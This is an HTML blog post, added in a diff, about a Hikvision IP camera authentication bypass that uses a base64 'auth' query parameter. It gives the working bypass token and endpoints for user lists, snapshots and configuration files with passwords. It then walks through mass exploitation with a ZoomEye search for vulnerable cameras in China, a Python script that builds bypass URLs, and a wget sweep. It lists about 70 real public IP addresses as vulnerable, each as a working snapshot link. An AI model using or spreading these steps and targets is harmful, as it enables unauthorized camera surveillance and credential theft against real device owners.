@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+    <meta charset="UTF-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;" name="viewport" />
+    <title>HikvisionIP摄像头后台绕过 | RavelloH's Blog</title>
+    <meta name="keywords" content="RavelloH,blog,python,spider,html">
+    <meta name="description" content="应用HikvisionIP摄像头后台绕过漏洞快速查询目标">
+    <!-- CSS -->
+    <link type="text/css" rel="stylesheet" href="css/common.css">
+    <link type="text/css" rel="stylesheet" href="/css/style.css">
+    <link type="text/css" rel="stylesheet" href="/css/iconfont.css">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+
+<body>
+    <section class="showcase">
+        <div class="shade"></div>
+        <header>
+            <h2 class="logo">
+                <a href="/" class="logos">
+                    <img class="logoimg" src="/img/avatar.jpg" style="width: 1.5em;border-radius: 50%;" alt="avatar">
+                    <img class="logoname" src="/img/RavelloH.svg" alt="RavelloH's Blog">
+                </a>
+            </h2>
+            <div class="headers">
+                <nav>
+                    <a href="/">
+                        HOME
+                    </a>
+                    <a href="/works/">
+                        WORKS
+                    </a>
+                    <a href="/articles/">
+                        ARTICLES
+                    </a>
+                    <a href="/tag/">
+                        TAG
+                    </a>
+                    <a href="/about/">
+                        ABOUT
+                    </a>
+                </p>
+            </nav>
+        </div>
+        <div class="toggle" class="header">
+        </div>
+    </header>
+
+    <div class="overlay"></div>
+    <div class="article" id="text">
+        <h2>HikvisionIP摄像头后台绕过</h2>
+        <span class="iconfontmini icon-clock"></span> 2022-12-24 • <span
+            class="iconfontmini icon-classification"></span>
+        <a href="/classification/#安全">安全</a> - <a href="/classification/#设计">设计</a> •
+        <span class="iconfontmini icon-tag"></span>
+        <a class="tag" href="/tag/#javascript">JAVASCRIPT</a> • <span class="iconfontmini icon-friend"></span> <span id="twikoo_visitors"></span>
+        <div>
+            <h4><b><em>Menu - 目录列表</em></b></h4>
+            <a class="m" href="#起因">起因</a>
+            <a class="m" href="#漏洞介绍">漏洞介绍</a>
+            <a class="m" href="#实践">实践</a>
+            <a class="m" href="#后言">后言</a>
+        </div>
+        <hr>
+        <br>
+        <div class="center info">
+            <em>
+                <b>注:此漏洞已于2017年被修复。本文仅作为学习用途。</b>
+                <br /><br />
+            </em>
+            <em>
+                <span id="loadingtext"></span>
+            </em>
+        </div>
+        <br>
+        <br>
+
+        <h4><a name="起因" href="#起因">#起因</a></h4>
+        <p>
+            最近在学校用Kali扫内网ms17-010的时候，发现扫了一大堆主机居然只扫出来两个，而且在攻击时发现的确没用。<br>
+            诚然，永恒之蓝作为2017年的漏洞，早已在当时被紧急修复，五年过去依旧存在这个漏洞的Windows7设备已经寥寥无几了。但是在用nmap扫描时，我发现学校内有 <code>Hikvision IP camera</code>设备，大概都是2016年装上的，于是回家一查，果然存在一个后台绕过漏洞。<br>
+            但是不巧的是，因为疫情封校还没法回去实践，于是在这里应用一下，看看公网上还有多少设备存在这漏洞。
+        </p>
+        <br>
+        <br>
+        <h4><a name="漏洞介绍" href="#漏洞介绍">#漏洞介绍</a></h4>
+        <p>
+            <div class="codeline">
+                <pre>
+                    <span>// 摘抄自 packetstormsecurity</span>
+                    <span>Hikvision camera API includes support for proprietary HikCGI protocol, which exposes URI endpoints through the camera's web interface. The HikCGI protocol handler checks for the presence of a parameter named "auth" in the query string and if that parameter contains a base64-encoded "username:password" string, the HikCGI API call assumes the idntity of the specified user. The password is ignored.</span>
+                    <span>Virtually all Hikvision products come with a superuser account named "admin", which can be easily impersonated.</span>
+                </pre>
+            </div>
+            也就是说我们可以直接通过在链接后加入 <code>"?auth="+[base64编码的用户名:密码]</code>的形式轻松绕过。这个 <code>[base64编码的用户名:密码]</code>仅需要用户名对应，密码是什么无所谓，所以我们可以直接随便加密一个：
+            <div class="codeline">
+                <pre>
+                    <span>admin:11</span>
+                    <span>↓base64↓</span>
+                    <span>YWRtaW46MTEK</span>
+                </pre>
+            </div>
+            也就是说，我们在需要权限的页面url上直接加入?auth=YWRtaW46MTEK就能绕过验证。这些url包括:
+            <div class="codeline">
+                <pre>
+                    <span>// 获取用户列表</span>
+                    <span>http://camera.ip:port/Security/users?auth=YWRtaW46MTEK</span>
+                    <span>// 获取快照</span>
+                    <span>http://camera.ip:port/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>// 获得摄像头配置</span>
+                    <span>http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK</span>
+                </pre>
+            </div>
+            从结果上来看，获取用户列表的结果是这样的：
+            <div class="codeline">
+                <pre>
+                    <span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+                    <span>&lt;UserList version=&quot;1.0&quot; xmlns=&quot;http://www.hikvision.com/ver10/XMLSchema&quot;&gt;</span>
+                    <span>    &lt;User version=&quot;1.0&quot; xmlns=&quot;http://www.hikvision.com/ver10/XMLSchema&quot;&gt;</span>
+                    <span>        &lt;id&gt;1&lt;/id&gt;</span>
+                    <span>        &lt;userName&gt;admin&lt;/userName&gt;</span>
+                    <span>        &lt;priority&gt;high&lt;/priority&gt;</span>
+                    <span>        &lt;ipAddress&gt;0.0.0.0&lt;/ipAddress&gt;</span>
+                    <span>        &lt;macAddress&gt;00:00:00:00:00:00&lt;/macAddress&gt;</span>
+                    <span>        &lt;userLevel&gt;Administrator&lt;/userLevel&gt;</span>
+                    <span>    &lt;/User&gt;</span>
+                    <span>&lt;/UserList&gt;</span>
+                </pre>
+            </div>
+            获取快照则会得到当前截图：
+            <img src='img1.png'><br />
+            而获得配置则会直接得到一份当前摄像头的配置情况，包括账号密码。 <br />
+            值得注意的是，这里的配置其实也简单加密了一下，实际上的密钥似乎是abcdefg，不过这不难解决，在github上就有相关的解密工具。 <a class="linkline" href="https://github.com/WormChickenWizard/hikvision-decrypter">Github@WormChickenWizard/hikvision-decrypter</a> <br />
+            解密前它是一个二进制文件，解密后它同样也是一个二进制文件，不过解密后可以直接用Hex编辑器搜索 <code>admin</code>，密码就在它的下两行。
+        </p>
+
+        <br>
+        <br>
+        <h4><a name="实践" href="#实践">#实践</a></h4>
+        <h5><strong>
+            0x01 - 获得目标:
+        </strong></h5>
+        <p>
+            这里借助zoomeye的命令行插件请求，方便后续的数据导出。(网页版zoomeye导出数据需会员) <br />
+            可自Github下载: <a class="linkline" href="https://github.com/knownsec/ZoomEye-python">Github@knownsec/ZoomEye-python</a><br />
+            首先需要配置这个命令行工具，这里略，因为在Github仓库内有详细的中文文档说明。仅需填入API key即可。 <br />
+            之后我们就可以使用这个搜索了，例子如下:
+
+            <div class="codeline">
+                <pre>
+                    <span>zoomeye search 'iconhash: "89b932fcc47cf4ca3faadb0cfdef89cf" +2016 +country:"CN" +after:"2021-12-22" +app:"Hikvision IP camera httpd"' -num 20</span>
+                </pre>
+            </div>
+            正确执行后，输出应该类似这样：
+            <img src="img2.png" alt="输出实例" />
+            解析一下以上搜索的命令: <br />
+            <li>网站图标 - 'iconhash: "89b932fcc47cf4ca3faadb0cfdef89cf" (Hikvision监控页面图标)</li>
+            <li>监控年份 - 2016 (此漏洞2017得到修复，我们往前推一年，成功率比较大)</li>
+            <li>索引国家 - country:"CN" (自家兄弟，速度快)</li>
+            <li>索引时间 - after:"2021-12-22"  (索引最近一年的数据)</li>
+            <li>索引类型 - app:"Hikvision IP camera httpd" (只索引这个IP摄像头)</li>
+            <li>查找数量 - -num 20 (测试用，仅查找20个，悠着点用，免费版每个月只有10000次)</li>
+            这就八九不离十了，如果需要更进一步还可以加上额外选项，如city:"shanghai"等等，详见zoomeye官网。 <br />
+            接下来就是导出，因为工具本来就有<code>-save</code>选项，十分简单
+            <div class="codeline">
+                <pre>
+                    <span>zoomeye search 'iconhash: "89b932fcc47cf4ca3faadb0cfdef89cf" +2016 +country:"CN" +after:"2021-12-22" +app:"Hikvision IP camera httpd"' -num 1000 -save port</span>
+                </pre>
+            </div>
+            这里唯一增加的选项是 <code>-save port</code>，表示额外存储端口(默认必存IP)，另外将数量至1000，有需要也可以设置多一些。 <br />
+            不过因为导出是每次请求20个结果的缘故需要时间，等待导出即可。<br>
+            导出的结果如下:
+            <div class="codeline">
+                <pre>
+                    <span>{'ip': '221.0.16.166', 'port': 8808}</span>
+                    <span>{'ip': '60.216.142.12', 'port': 8808}</span>
+                    <span>{'ip': '27.211.181.181', 'port': 8808}</span>
+                    <span>{'ip': '61.132.107.234', 'port': 32400}</span>
+                    <span>{'ip': '111.23.146.92', 'port': 32400}</span>
+                    <span>{'ip': '113.234.39.166', 'port': 995}</span>
+                    <span>{'ip': '112.232.246.135', 'port': 8808}</span>
+                    <span>{'ip': '112.232.247.90', 'port': 8808}</span>
+                    <span>{'ip': '39.71.193.248', 'port': 8808}</span>
+                    <span>{'ip': '39.71.192.8', 'port': 8808}</span>
+                    <span>{'ip': '114.33.140.212', 'port': 8883}</span>
+                    <span>{'ip': '137.189.185.154', 'port': 8005}</span>
+                    <span>{'ip': '182.135.224.187', 'port': 8005}</span>
+                    <span>{'ip': '112.240.5.75', 'port': 8005}</span>
+                    <span>{'ip': '1.65.200.1', 'port': 8883}</span>
+                    <span>{'ip': '114.246.201.88', 'port': 88}</span>
+                    <span>{'ip': '114.246.216.66', 'port': 88}</span>
+                    <span>{'ip': '119.145.77.202', 'port': 88}</span>
+                    <span>{'ip': '182.84.45.51', 'port': 88}</span>
+                    <span>{'ip': '122.247.197.186', 'port': 88}</span>
+                    <span>{'ip': '122.244.52.251', 'port': 88}</span>
+                    <span>{'ip': '122.240.1.130', 'port': 88}</span>
+                    <span>{'ip': '122.245.80.91', 'port': 88}</span>
+                    <span>{'ip': '122.240.204.77', 'port': 88}</span>
+                    <span>......</span>
+                </pre>
+            </div>
+        </p>
+        <h5><strong>
+            0x02 - 格式重组:
+        </strong></h5>
+        <p>
+            接下来就是去验证每个IP是否有效。 <br />
+            我这里是采用获取快照的方式，可以方便的用wget的--spider模式确认是否能访问到快照。 <br />
+            那么就需要先去得到有效的url，在上面zoomeye导出的时候会生成一个json，我们在这里可以直接每行解析一下，将完成结果写入到另一个文件中。 <br />
+            <div class="codeline">
+                <pre>
+                    <span># python 3</span>
+                    <span># -*- coding: utf-8 -*-</span>
+                    <span>import os</span>
+                    <span>import time</span>
+                    <span>from datetime import datetime </span>
+                    <span>import json</span>
+                    <span>urls0 = 'https://'</span>
+                    <span>urls1 = 'http://'</span>
+                    <span>urls3 = '/onvif-http/snapshot?auth=YWRtaW46MTEK'</span>
+                    <span></span>
+                    <span># 初始化 </span>
+                    <span>startTime = time.localtime()</span>
+                    <span>startDateTime = datetime.now()</span>
+                    <span>print('[初始化进程运行] - '+time.strftime("%H:%M:%S",time.localtime()))</span>
+                    <span></span>
+                    <span>if 'targets.json' in os.listdir('.'):</span>
+                    <span>    with open(r'./targets.json','r') as fp:</span>
+                    <span>        l1 = fp.readlines()</span>
+                    <span>    print(f'  检测到目标，共载入{len(l1)}个数据')</span>
+                    <span>else:</span>
+                    <span>    print('[Error]未检测到targets.json，无目标')</span>
+                    <span>    exit()</span>
+                    <span></span>
+                    <span>print('[主进程运行]')</span>
+                    <span>for i in range(len(l1)):</span>
+                    <span>    jsons = json.loads(str(l1[i]).replace('\n','').replace('\'','"'))</span>
+                    <span>    url2 = str(jsons['ip'])+':'+str(jsons['port'])</span>
+                    <span>    with open(r'./ok.info','a') as f2: </span>
+                    <span>        f2.write(urls1+url2+urls3+'\n')</span>
+                    <span>    print('\r'+time.strftime("%H:%M:%S",time.localtime())+'» 总进度:['+'|'*(i//(len(l1)//50)+1)+' '*(50-(i//(len(l1)//50))-1)+']'+str(i)+'/'+str(len(l1))+' - '+str(round(float((i/len(l1)))*100,2))+'%')</span>
+                </pre>
+            </div>
+            上面这个python小程序会把它所在文件夹内的 <code>targets.json</code>中的全部ip转换为url形式存储在 <code>result.txt</code>中，每行一个：
+            <div class="codeline">
+                <pre>
+                    <span>http://221.0.16.166:8808/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://60.216.142.12:8808/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://27.211.181.181:8808/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://61.132.107.234:32400/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://111.23.146.92:32400/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://113.234.39.166:995/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://112.232.246.135:8808/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://112.232.247.90:8808/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://39.71.193.248:8808/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://39.71.192.8:8808/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://114.33.140.212:8883/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://182.135.224.187:8005/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://112.240.5.75:8005/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://1.65.200.1:8883/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://114.246.201.88:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://114.246.216.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://119.145.77.202:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://182.84.45.51:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://122.247.197.186:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://122.244.52.251:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://122.240.1.130:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://122.245.80.91:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://122.240.204.77:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>......</span>
+                </pre>
+            </div>
+            这样的格式就让我们看起来很舒服了，接下来就可以用wget去逐一验证:
+        </p>
+        <h5><strong>
+            0x03 - 验证目标:
+        </strong></h5>
+        <p>
+            <div class="codeline">
+                <pre>
+                    <span>wget --tries 1 --timeout 1 -nv -o data.log --spider -i result.txt</span>
+                </pre>
+            </div>
+            此操作将静默进行，结果会用wget的简洁模式存储在data.log中，方便我们检索。 <br />
+            上面设置的超时时间与超时重试次数都是1，耗时较短，如果有耐心可以设置大一点。 <br />
+            完成后，data.log中的结果应该如下: <br />
+            <div class="codeline">
+                <pre>
+                    <span>failed: Connection timed out.</span>
+                    <span>2022-12-23 18:05:11 URL: http://39.89.12.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK 200 OK</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>Username/Password Authentication Failed.</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>Read error (Connection timed out) in headers.</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>Username/Password Authentication Failed.</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>Username/Password Authentication Failed.</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>failed: Connection refused.</span>
+                    <span>2022-12-23 18:05:36 URL: http://27.223.48.100:88/onvif-http/snapshot?auth=YWRtaW46MTEK 200 OK</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>failed: Connection refused.</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>failed: Connection refused.</span>
+                    <span>failed: Connection refused.</span>
+                    <span>Username/Password Authentication Failed.</span>
+                    <span>2022-12-23 18:05:39 URL: http://221.215.171.198:81/onvif-http/snapshot?auth=YWRtaW46MTEK 200 OK</span>
+                    <span>failed: Connection refused.</span>
+                    <span>......</span>
+                </pre>
+            </div>
+            可以看到，能成功访问的url都有200标识，逐一解释一下其余的:
+            <li>failed: Connection timed out. - 无法连接</li>
+            <li>Read error (Connection timed out) in headers. - 无法连接</li>
+            <li>failed: Connection refused. - 可以连接，但不存在此漏洞</li>
+            <li>Username/Password Authentication Failed. - 存在此漏洞，但默认用户名不是admin</li>
+            <br />
+            为了方便我们进一步处理，用正则表达式替换以下字符为空:
+            <div class="codeline">
+                <pre>
+                    <span>// 以下不需要使用正则表达式</span>
+                    <span>Username/Password Authentication Failed.</span>
+                    <span>failed: Connection timed out.</span>
+                    <span>failed: Connection refused.</span>
+                    <span>Read error (Connection timed out) in headers.</span>
+                    <span>Remote file does not exist -- broken link!!!</span>
+                    <span> 200 OK</span>
+                    <span> </span>
+                    <span>// 以下需要使用正则表达式</span>
+                    <span>^.*:$ // 去除坏链</span>
+                    <span>[0-9]*-[0-9]*-[0-9]* [0-9]*:[0-9]*:[0-9]* URL: //去除时间</span>
+                    <span>[ \t\n]*$ //去除空行&空格</span>
+                </pre>
+            </div>
+            不出意外的话，最后留下的就是存在漏洞的链接了。 <br />
+            我这里试了一下，1000个ip中大概有70个存在此漏洞，也就是7%吧 <br />
+            附最终结果：
+            <div class="codeline">
+                <pre>
+                    <span>http://221.0.16.166:8808/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://27.211.181.181:8808/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://114.246.216.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://116.132.38.26:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://61.155.60.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://111.17.186.222:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://60.211.176.138:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://139.170.232.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://60.29.192.154:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://218.17.121.235:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://222.135.125.233:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://120.211.63.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://120.236.75.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://115.238.136.42:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://39.89.12.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://27.9.47.186:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://220.132.146.242:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://110.167.76.104:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://112.16.175.58:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://222.184.120.162:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://119.120.224.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://180.161.47.184:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://180.161.91.12:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://211.140.148.199:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://211.143.231.238:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://223.68.200.14:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://114.218.22.55:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://59.173.49.211:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://119.1.107.250:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://27.200.21.66:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://27.196.174.10:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://103.100.64.75:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://180.158.150.171:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://218.203.76.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://117.86.108.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://116.232.75.214:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://116.230.31.118:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://125.123.232.251:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://183.214.115.6:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://101.74.233.94:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://180.165.218.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://114.88.37.77:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://114.95.248.231:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://220.178.172.134:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://220.180.211.97:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://124.77.94.21:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://114.233.4.106:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://114.231.243.80:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://125.90.3.102:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://125.95.237.71:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://14.120.74.123:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://223.82.14.139:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://223.94.87.221:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://223.82.36.194:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://116.11.185.163:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://183.250.109.133:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://183.250.246.173:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://183.247.200.105:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://183.248.215.239:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://183.196.178.34:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://115.171.0.224:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://183.233.250.61:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://183.238.201.243:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://111.194.239.146:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://61.131.71.114:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://218.94.67.130:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://218.88.5.67:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://183.63.221.22:88/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>http://137.189.185.154:8005/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
+                    <span>......</span>
+                </pre>
+            </div>
+            也可以选择在<a href="show.html">show.html</a>查看可用度。 <br />
+            其余如何利用漏洞的环节不再赘述，不要用于非法用途。
+        </p>
+
+        <h4><a name="后言" href="#后言">#后言</a></h4>
+        <p>
+            上述就是对2017年 HikvisionIP摄像头后台绕过漏洞的应用， 终。<br />
+            
+        </p>
+
+
+        <hr>
+        <br>
+        <span class="iconfontmini icon-aboutcircle"></span> 原创内容使用 知识共享 署名-非商业性使用-相同方式共享 4.0 (CC BY-NC-ND
+        4.0)
+        协议授权。
+
+        <br><br>
+        <div id="tcomment"></div>
+        <script src="https://cdn.staticfile.org/twikoo/1.6.4/twikoo.all.min.js"></script>
+        <script>
+            twikoo.init({
+                envId: 'https://comment.z-blog.tk/',
+                el: '#tcomment',
+            })
+        </script>
+
+    </div>
+    <ul class="social">
+        <li><a href="/about/"><span class="iconfont icon-about"></span></a></li>
+        <li><a href="http://github.com/ravelloh" target="_blank" rel="noreferrer"><span
+            class="iconfont icon-github"></span></a></li>
+        <li>
+            <a href="http://xeocnet-studio.github.io" target="_blank" rel="noreferrer">
+                <span class="iconfont icon-home">
+                </span>
+            </a>
+        </li>
+        <li><a href="/RSS/rss.xml" target="_blank"><span class="iconfont2 icon-rss"></span></a></li>
+    </ul>
+</section>
+<div class="menu">
+    <ul>
+        <script type="text/javascript" src="/js/menu.js"></script>
+    </ul>
+</div>
+<script>
+    var img = [];
+    var flag = 0;
+    var mulitImg = ['img1.png', 'img2.png'];
+    var imgTotal = mulitImg.length; //图片总数
+    for (var i = 0; i < imgTotal; i++) {
+        document.getElementById("loadingtext").innerHTML = "*文章插图加载中:" + flag + "/" + imgTotal;
+        img[i] = new Image()
+        img[i].src = mulitImg[i]
+        img[i].onload = function () {
+            flag++;
+            if (flag == imgTotal) {
+                document.getElementById("loadingtext").innerHTML = "*文章插图加载完成:" + flag + "/" + imgTotal;
+            } else {
+                document.getElementById("loadingtext").innerHTML = "*文章插图加载中:" + flag + "/" + imgTotal;
+                return;
+            }
+        }
+    }
+</script>
+
+<!-- JavaScript -->
+<script src="/js/script.js"></script>
+<script type="text/javascript" src="/js/common.js"></script>
+<script src="//instant.page/5.1.1" type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+
+
+</body>
+
+</html>
